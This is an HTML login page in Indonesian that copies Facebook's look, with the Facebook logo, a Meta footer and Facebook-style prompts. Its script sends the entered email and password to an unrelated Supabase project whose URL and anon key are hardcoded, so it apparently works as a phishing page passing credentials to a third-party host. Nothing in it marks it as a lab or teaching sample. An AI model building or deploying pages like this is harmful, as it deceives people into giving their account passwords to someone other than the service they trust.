<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login ke Supabase</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
  <link rel="stylesheet" href="login.css">
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo" class="logo">

    <div class="login-box">
       <div class="profile-photo">
         <img src="Screenshot_20250530_090652_Chrome.jpg" alt="Foto Anda">
  </div> 
      <input type="email" id="email" placeholder="Nomor ponsel atau email">
      <input type="password" id="password" placeholder="Kata sandi">
      <button onclick="login()">Login</button>
      <a href="#" class="forgot-link">Lupa kata sandi?</a>
    </div>

    <button class="create-account">Buat akun baru</button>

    <footer>
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
      <div class="footer-links">
        <a href="#">Tentang</a>
        <a href="#">Bantuan</a>
        <a href="#">Lainnya</a>
      </div>
    </footer>
  </div>

  <script>
    const { createClient } = supabase;
    const supabaseClient = createClient(
      'https://qngixdibqzxarqpoqypz.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFuZ2l4ZGlicXp4YXJxcG9xeXB6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg0MTY2NDMsImV4cCI6MjA2Mzk5MjY0M30.a-LJ2EcgzuNm7K_9k_GH5C0ognKVIlXU-aSASE-2rcM'
    );

    async function login() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password });

      const msg = document.createElement("p");
      msg.id = "message";
      msg.textContent = error ? "Gagal login: " + error.message : "Berhasil login, redirect...";
      document.querySelector(".login-box").appendChild(msg);

      if (!error) {
        setTimeout(() => window.location.href = "index.html", 500);
      }
    }
  </script>
</body>
</html>
